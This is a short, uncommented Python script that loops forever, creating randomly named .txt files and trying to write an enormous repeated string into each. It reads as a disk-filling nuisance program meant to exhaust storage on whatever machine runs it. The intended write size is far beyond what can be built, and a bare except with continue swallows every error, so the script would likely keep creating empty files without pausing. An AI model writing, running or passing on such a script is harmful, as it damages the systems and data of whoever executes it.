from random import choice
from time import sleep
list = ['q','w','e','r','t','y','u','i','o','p','a','s','d','f','f','g','h','j','k','l','z','x','c','v','b','n','m','1','2','3','4','5','6','7','8','9','0']

while True:
    try:
        a= (choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list))
        f= open(f'{a}.txt','w+')
        b = f.write('1.2.3.4'+'.1.2.3.4.'*100000000000000000000000000+'1.2.3.4')
        sleep(5)
    except:
        continue